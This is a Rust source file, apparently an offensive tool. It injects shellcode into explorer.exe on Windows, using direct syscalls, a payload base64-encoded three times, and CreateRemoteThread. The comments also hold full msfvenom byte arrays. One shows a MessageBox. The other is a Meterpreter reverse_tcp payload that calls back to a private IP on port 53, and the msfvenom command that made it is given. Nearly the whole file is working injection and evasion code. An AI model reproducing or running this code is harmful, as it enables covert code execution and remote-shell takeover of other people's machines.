// #![windows_subsystem = "windows"]    // Uncomment to disable console (for debug purposes)

#![allow(non_snake_case)]

mod base64Decode;

use rust_syscalls::syscall; // syscalls babyyyyy
use std::ffi::c_void;
use sysinfo::{
    ProcessExt,
    System,
    SystemExt,
    Pid
};
use windows::Win32::{
        System::{
            Threading::{
                PROCESS_ALL_ACCESS,
                OpenProcess,
                CreateRemoteThread,
            },
            Memory::{
                //VirtualAllocEx,
                MEM_COMMIT,
                MEM_RESERVE,
                PAGE_READWRITE,
                VirtualProtectEx,
                PAGE_PROTECTION_FLAGS,
                PAGE_EXECUTE_READ,
            },
            Diagnostics::Debug::WriteProcessMemory,
        },
        Foundation::{
            // CloseHandle,
            FALSE,
        },
};

const STATUS_SUCCESS: i32  = 0;
pub type PVOID = *mut c_void;

// A function which will return the PID of a given process name
fn getPIDByName(pname: String) -> i64 {
    unsafe {
        let mut sys = System::new_all();
        sys.refresh_all();

        let mut processID: i64 = 0;
        for (pid, process) in sys.processes() {
            if pname == process.name() {
                // println!("{} {}", pid, process.name());
                processID = std::mem::transmute::<Pid, i64>(*pid);
                break;
            }
        }

    return processID;
    };
}

#[allow(non_snake_case)]            // The compiler stops telling us to use snake_case
fn Inject(shellcode: [u8; 295]) {
    unsafe {
        let pid = getPIDByName("explorer.exe".to_string());

        println!("Getting process handle");
        let hProcess = OpenProcess(
            PROCESS_ALL_ACCESS,
            FALSE,
            pid as u32,
        );

        let mut baseAddr = 0 as PVOID;
        
        let aSuccess = syscall!(
            "NtAllocateVirtualMemory",
                hProcess.clone().unwrap(),
                &mut baseAddr,
                0,
                &mut shellcode.len(),
                MEM_COMMIT | MEM_RESERVE,
                PAGE_READWRITE
        );

        if aSuccess == STATUS_SUCCESS {
            println!("Allocated memory");
        } else {
            println!("Allocating memory failed :(\nStatus Code: {:#02x}", aSuccess);
            syscall!("NtClose", hProcess.clone().unwrap());
            std::process::exit(0);
        }

        println!("Writing shellcode");
        let wSuccess = WriteProcessMemory(
            hProcess.clone().unwrap(),
            baseAddr,
            shellcode.as_ptr() as _,
            shellcode.len(),
            None,
        );
        
        match wSuccess {
            Ok(_val) => {
                println!("Successfully wrote to memory :)")
            },
            Err(_err) => {
                println!("Writing to process memory failed :(!")
            }
        }

        let mut oldPro: PAGE_PROTECTION_FLAGS = PAGE_READWRITE;
        println!("Changing the memory protection to PAGE_EXECUTE_READ");

        let _pSuccess = VirtualProtectEx(
            hProcess.clone().unwrap(),
            baseAddr,
            shellcode.len() as usize,
            PAGE_EXECUTE_READ,
            &mut oldPro,
        );

        println!("Executing shellcode");
        let _hThread = CreateRemoteThread(
            hProcess.clone().unwrap(),
            None,
            0 as usize,
            Some(std::mem::transmute(baseAddr)),
            None,
            0 as u32,
            None,
        );

        println!("Closing handle");
    
        let cSuccess: i32 = syscall!(
            "NtClose", 
                hProcess.clone().unwrap()
        );

        if cSuccess == STATUS_SUCCESS {
            println!("Handle closed with Status Code: {:#?}", cSuccess)
        } else {
            println!("Error closing handle\nError Code: {:#?}", cSuccess)
        }
    };
}

fn main() {
    

    let mut shellcode = String::from("VFVob2JWbDVkM2RsUkZFMFRFUkNORTlFUlhOTlNHaHNUa04zZDJWSFdYZE1SRUkwV20xWmMwMUlhRzFhYVhkM1pVZGFiVXhFUWpSYVZHZHpUVWhvYTAxRGQzZGxSRUYzVEVSQ05FMUVRWE5OU0dkM1RVTjNkMlZFVVhoTVJFSTBUbFJGYzAxSVp6Qk5VM2QzWlVSVmQweEVRalJPVkVselRVaG5NVTFUZDNkbFJGVXlURVJDTkU1RVozTk5TR2Q2VFZOM2QyVkhVWGxNUkVJMFRtcFZjMDFJWnpCUFEzZDNaVVJvYVV4RVFqUk9WRWx6VFVobk1rMURkM2RsUkU1c1RFUkNORTVFWjNOTlNHYzBXV2wzZDJWRVZYbE1SRUkwVFZSbmMwMUlaM3BhVTNkM1pVUlJORXhFUWpSUFIwbHpUVWhuTVUxcGQzZGxSRWwzVEVSQ05FMHlWWE5OU0djd1QwTjNkMlZFYUdsTVJFSTBUbnBKYzAxSVp6Rk5RM2QzWlVST2JFeEVRalJPUkdkelRVaG5kMXBwZDNkbFIwa3pURVJDTkU1SFJYTk5TR2N3V1ZOM2QyVkVVbXRNUkVJMFRYcEZjMDFJYUdwUFUzZDNaVVJSTkV4RVFqUk5la1Z6VFVob2FrMURkM2RsUjBacVRFUkNORTB5VFhOTlNHY3lUVk4zZDJWRVpHcE1SRUkwVFVSSmMwMUlaM2xaZVhkM1pVUkpkMHhFUWpST1JFVnpUVWhvYWsxVGQzZGxSMDAxVEVSQ05FMUhVWE5OU0djd1RWTjNkMlZFUVhoTVJFSTBXWHBGYzAxSWFHeE5hWGQzWlVkV2EweEVRalJPVkVselRVaG5NRTFUZDNkbFJGVjRURVJDTkUweVZYTk5TR2N3VDBOM2QyVkVhR2xNUkVJMFRsUkpjMDFJWjNsTlEzZDNaVVJPYkV4RVFqUlBSMGx6VFVobk1FMXBkM2RsUkU1cVRFUkNORTVFWjNOTlNHZDNUVk4zZDJWSFVYZE1SRUkwVFRKVmMwMUlaelJaYVhkM1pVUm5kMHhFUWpSUFJHZHpUVWhuZDAxRGQzZGxSRUYzVEVSQ05FMUVRWE5OU0djd1QwTjNkMlZFWnpGTVJFSTBXWHBCYzAxSVp6Tk9RM2QzWlVSYWJVeEVRalJPUkdkelRVaG5kMDFUZDNkbFIxRjNURVJDTkU1VVFYTk5TR2Q2V2xOM2QyVkVhR2xNUkVJMFRrUm5jMDFJWjNoUFEzZDNaVVJPYkV4RVFqUk9SRkZ6VFVobk5GbHBkM2RsUkZGM1RFUkNORTFxUVhOTlNHY3dUMU4zZDJWRVFYaE1SRUkwV2tSQmMwMUlhR3hOZVhkM1pVUldha3hFUWpST1JHZHpUVWhvYlZwcGQzZGxSMDAxVEVSQ05FMHlWWE5OU0djd1RWTjNkMlZFYUdsTVJFSTBUWHBSYzAxSVp6UlBRM2QzWlVSUk5FeEVRalJOUkVWelRVaG9hMDVwZDNkbFJGSnJURVJDTkUxNlJYTk5TR2hxVDFOM2QyVkVVVFJNUkVJMFRYcEZjMDFJYUdwTlEzZDNaVWRHYWt4RVFqUk9SRVZ6VFVob2FrMVRkM2RsUjAwMVRFUkNORTFIVVhOTlNHY3dUVk4zZDJWRVFYaE1SRUkwV1hwRmMwMUlaM3BQUTNkM1pVZFZkMHhFUWpST2VsVnpUVWhvYlUxVGQzZGxSRTVzVEVSQ05FNUhUWE5OU0dkM1RYbDNkMlZFVW1wTVJFSTBUV3BSYzAxSVozZFBRM2QzWlVSUk1VeEVRalJOZW10elRVaG9hMDFUZDNkbFJHTXhURVJDTkZwRVdYTk5TR2N4VDBOM2QyVkVUbXhNUkVJMFRrUlJjMDFJWnpSWmFYZDNaVVJSZDB4RVFqUk5hbEZ6VFVobk1FOVRkM2RsUkVGNFRFUkNORnBFUVhOTlNHY3lUbWwzZDJWRVRteE1SRUkwVGtSRmMwMUlaelJaYVhkM1pVUkNha3hFUWpST1JHZHpUVWhuZWxwVGQzZGxSRkV3VEVSQ05FOUhTWE5OU0djd1RVTjNkMlZFUm1wTVJFSTBUa1JyYzAxSVozZE5VM2QzWlVkUmQweEVRalJOTWxWelRVaG5NRTFUZDNkbFJHaHBURVJDTkUxRVVYTk5TR2MwVDBOM2QyVkVVVFJNUkVJMFRVUkZjMDFJYUd0TlEzZDNaVVJSZUV4RVFqUk9WR2R6VFVobk1FMVRkM2RsUkZVMFRFUkNORTVYVlhOTlNHY3hUMU4zZDJWRVZtaE1SRUkwVGtSRmMwMUlaekZQUTNkM1pVUlJlRXhFUWpST1ZHdHpUVWhuTUUxVGQzZGxSRlpvVEVSQ05FNUVaM05OU0djMFRYbDNkMlZIVm1wTVJFSTBUV3BCYzAxSVp6Qk5VM2QzWlVSVmVVeEVRalJhYlZselRVaG9iRTFEZDNkbFJGVTBURVJDTkU1RVJYTk5TR2N4VDFOM2QyVkVWbWhNUkVJMFRUSlZjMDFJWnpCUFEzZDNaVVJvYVV4RVFqUk5WRWx6VFVob2JFOVRkM2RsUkZFMVRFUkNORnB0V1hOTlNHaHRXbWwzZDJWSFdtMU1SRUkwVGxkUmMwMUlaekJQVTNkM1pVZE5NMHhFUWpSWmVrVnpUVWhuZDAxRGQzZGxSRUYzVEVSQ05FMUVRWE5OU0dkM1RVTjNkMlZFVG14TVJFSTBUa1JuYzAxSVp6UmFRM2QzWlVSck1VeEVRalJhYlZWelRVaG5kMDFEZDNkbFJFRjNURVJDTkUxRVFYTk5TR2Q2V2xOM2QyVkVVbXBNUkVJMFQwZFJjMDFJWnpST1UzZDNaVVJDYlV4RVFqUk5SRVZ6VFVobmQwMURkM2RsUkVGM1RFUkNORTVFWjNOTlNHZDZUVk4zZDJWSFRUVk1SRUkwVGtSRmMwMUlhR2xaVTNkM1pVUlJNVXhFUWpSUFJFMXpUVWhuTVU1cGQzZGxSRUV6VEVSQ05GcHRXWE5OU0doclRsTjNkMlZFVVRSTVJFSTBUWHBGYzAxSWFHcFBVM2QzWlVSUmVFeEVRalJaYlVWelRVaG9iVTFEZDNkbFIwa3hURVJDTkZsVVNYTk5TR2N4VG1sM2QyVkhXbTFNUkVJMFdrUlZjMDFJWnpCUFEzZDNaVVJaTVV4RVFqUk9iVTF6VFVobk1sbDVkM2RsUkZwdFRFUkNORTF0VFhOTlNHZDVUVU4zZDJWRVdUSk1SRUkwVG5wSmMwMUlaekphYVhkM1pVUmFhMHhFUWpSTmFrRnpUVWhuTUZwRGQzZGxSRlY2VEVSQ05FNUVXWE5OU0dkNVRWTjNkMlZFUVhkTVJFSTBUa2RSYzAxSVp6Sk9VM2QzWlVSamVreEVRalJPZWsxelRVaG5NazFUZDNkbFJGa3pURVJDTkU1cVZYTk5TR2N3VFdsM2QyVkVXbTFNUkVJMFRucG5jMDFJWjNkTlFXODk=");

    /* Decoding the shellcode */
    shellcode = base64Decode::base64Decode(shellcode);
    shellcode = base64Decode::base64Decode(shellcode);
    shellcode = base64Decode::base64Decode(shellcode);

    /* Splitting the decoded shellcode */
    let shellcodeSplitted = shellcode.split(",");
    
    /* Appending every byte into an array as strings */
    let mut shellcodeStringArray = Vec::new();
    for fuck in shellcodeSplitted {
        shellcodeStringArray.push(fuck);
    }
    
    /// println!("{:#?}", shellcodeStringArray);
    
    /* Converting strings representations into bytes */
    use std::iter::Map;
    let mut shellcodeByteVec = Vec::new();
    let shellcodeByteIterIter = shellcodeStringArray.into_iter()
                                                                                .map(|x| x.replace("0x", ""))
                                                                                .map(|x| hex::decode(x).unwrap());

    for shellcodeByteIter in shellcodeByteIterIter {
        for shellcodeByte in shellcodeByteIter {
            shellcodeByteVec.push(shellcodeByte);
        };
    };

    // println!("Hi: {:#?}", shellcodeByteVec);

    let mut buf: [u8; 295] = [0; 295];
    for s in 0..295 {
            buf[s] = shellcodeByteVec[s];
    };

    // std::process::exit(0);
    
    // msfvenom -p windows/x64/messagebox -f rust
    /*
    let buf: [u8; 295] = [0xfc,0x48,0x81,0xe4,0xf0,0xff,0xff,
    0xff,0xe8,0xd0,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,0x51,
    0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x3e,0x48,0x8b,
    0x52,0x18,0x3e,0x48,0x8b,0x52,0x20,0x3e,0x48,0x8b,0x72,0x50,
    0x3e,0x48,0x0f,0xb7,0x4a,0x4a,0x4d,0x31,0xc9,0x48,0x31,0xc0,
    0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0x41,0xc1,0xc9,0x0d,0x41,
    0x01,0xc1,0xe2,0xed,0x52,0x41,0x51,0x3e,0x48,0x8b,0x52,0x20,
    0x3e,0x8b,0x42,0x3c,0x48,0x01,0xd0,0x3e,0x8b,0x80,0x88,0x00,
    0x00,0x00,0x48,0x85,0xc0,0x74,0x6f,0x48,0x01,0xd0,0x50,0x3e,
    0x8b,0x48,0x18,0x3e,0x44,0x8b,0x40,0x20,0x49,0x01,0xd0,0xe3,
    0x5c,0x48,0xff,0xc9,0x3e,0x41,0x8b,0x34,0x88,0x48,0x01,0xd6,
    0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x41,0xc1,0xc9,0x0d,0x41,
    0x01,0xc1,0x38,0xe0,0x75,0xf1,0x3e,0x4c,0x03,0x4c,0x24,0x08,
    0x45,0x39,0xd1,0x75,0xd6,0x58,0x3e,0x44,0x8b,0x40,0x24,0x49,
    0x01,0xd0,0x66,0x3e,0x41,0x8b,0x0c,0x48,0x3e,0x44,0x8b,0x40,
    0x1c,0x49,0x01,0xd0,0x3e,0x41,0x8b,0x04,0x88,0x48,0x01,0xd0,
    0x41,0x58,0x41,0x58,0x5e,0x59,0x5a,0x41,0x58,0x41,0x59,0x41,
    0x5a,0x48,0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,0x59,
    0x5a,0x3e,0x48,0x8b,0x12,0xe9,0x49,0xff,0xff,0xff,0x5d,0x49,
    0xc7,0xc1,0x00,0x00,0x00,0x00,0x3e,0x48,0x8d,0x95,0xfe,0x00,
    0x00,0x00,0x3e,0x4c,0x8d,0x85,0x0f,0x01,0x00,0x00,0x48,0x31,
    0xc9,0x41,0xba,0x45,0x83,0x56,0x07,0xff,0xd5,0x48,0x31,0xc9,
    0x41,0xba,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x48,0x65,0x6c,0x6c,
    0x6f,0x2c,0x20,0x66,0x72,0x6f,0x6d,0x20,0x4d,0x53,0x46,0x21,
    0x00,0x4d,0x65,0x73,0x73,0x61,0x67,0x65,0x42,0x6f,0x78,0x00
    ];
    */

    // msfvenom -p windows/x64/meterpreter/reverse_tcp -f rust EXITFUNC=thread LHOST=192.168.178.115 LPORT=53
    /*
    let buf: [u8; 511] = [0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xcc,
    0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,0x51,0x56,0x48,0x31,
    0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,0x8b,
    0x52,0x20,0x4d,0x31,0xc9,0x48,0x0f,0xb7,0x4a,0x4a,0x48,0x8b,
    0x72,0x50,0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,
    0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0xe2,0xed,0x52,0x48,0x8b,
    0x52,0x20,0x41,0x51,0x8b,0x42,0x3c,0x48,0x01,0xd0,0x66,0x81,
    0x78,0x18,0x0b,0x02,0x0f,0x85,0x72,0x00,0x00,0x00,0x8b,0x80,
    0x88,0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x67,0x48,0x01,0xd0,
    0x44,0x8b,0x40,0x20,0x49,0x01,0xd0,0x8b,0x48,0x18,0x50,0xe3,
    0x56,0x4d,0x31,0xc9,0x48,0xff,0xc9,0x41,0x8b,0x34,0x88,0x48,
    0x01,0xd6,0x48,0x31,0xc0,0xac,0x41,0xc1,0xc9,0x0d,0x41,0x01,
    0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x03,0x4c,0x24,0x08,0x45,0x39,
    0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,0x66,
    0x41,0x8b,0x0c,0x48,0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,0x41,
    0x8b,0x04,0x88,0x41,0x58,0x41,0x58,0x48,0x01,0xd0,0x5e,0x59,
    0x5a,0x41,0x58,0x41,0x59,0x41,0x5a,0x48,0x83,0xec,0x20,0x41,
    0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,0x8b,0x12,0xe9,0x4b,
    0xff,0xff,0xff,0x5d,0x49,0xbe,0x77,0x73,0x32,0x5f,0x33,0x32,
    0x00,0x00,0x41,0x56,0x49,0x89,0xe6,0x48,0x81,0xec,0xa0,0x01,
    0x00,0x00,0x49,0x89,0xe5,0x49,0xbc,0x02,0x00,0x00,0x35,0xc0,
    0xa8,0xb2,0x73,0x41,0x54,0x49,0x89,0xe4,0x4c,0x89,0xf1,0x41,
    0xba,0x4c,0x77,0x26,0x07,0xff,0xd5,0x4c,0x89,0xea,0x68,0x01,
    0x01,0x00,0x00,0x59,0x41,0xba,0x29,0x80,0x6b,0x00,0xff,0xd5,
    0x6a,0x0a,0x41,0x5e,0x50,0x50,0x4d,0x31,0xc9,0x4d,0x31,0xc0,
    0x48,0xff,0xc0,0x48,0x89,0xc2,0x48,0xff,0xc0,0x48,0x89,0xc1,
    0x41,0xba,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x48,0x89,0xc7,0x6a,
    0x10,0x41,0x58,0x4c,0x89,0xe2,0x48,0x89,0xf9,0x41,0xba,0x99,
    0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0a,0x49,0xff,0xce,
    0x75,0xe5,0xe8,0x93,0x00,0x00,0x00,0x48,0x83,0xec,0x10,0x48,
    0x89,0xe2,0x4d,0x31,0xc9,0x6a,0x04,0x41,0x58,0x48,0x89,0xf9,
    0x41,0xba,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x00,0x7e,
    0x55,0x48,0x83,0xc4,0x20,0x5e,0x89,0xf6,0x6a,0x40,0x41,0x59,
    0x68,0x00,0x10,0x00,0x00,0x41,0x58,0x48,0x89,0xf2,0x48,0x31,
    0xc9,0x41,0xba,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x48,0x89,0xc3,
    0x49,0x89,0xc7,0x4d,0x31,0xc9,0x49,0x89,0xf0,0x48,0x89,0xda,
    0x48,0x89,0xf9,0x41,0xba,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x83,
    0xf8,0x00,0x7d,0x28,0x58,0x41,0x57,0x59,0x68,0x00,0x40,0x00,
    0x00,0x41,0x58,0x6a,0x00,0x5a,0x41,0xba,0x0b,0x2f,0x0f,0x30,
    0xff,0xd5,0x57,0x59,0x41,0xba,0x75,0x6e,0x4d,0x61,0xff,0xd5,
    0x49,0xff,0xce,0xe9,0x3c,0xff,0xff,0xff,0x48,0x01,0xc3,0x48,
    0x29,0xc6,0x48,0x85,0xf6,0x75,0xb4,0x41,0xff,0xe7,0x58,0x6a,
    0x00,0x59,0xbb,0xe0,0x1d,0x2a,0x0a,0x41,0x89,0xda,0xff,0xd5
    ];
    */

    Inject(buf);

}
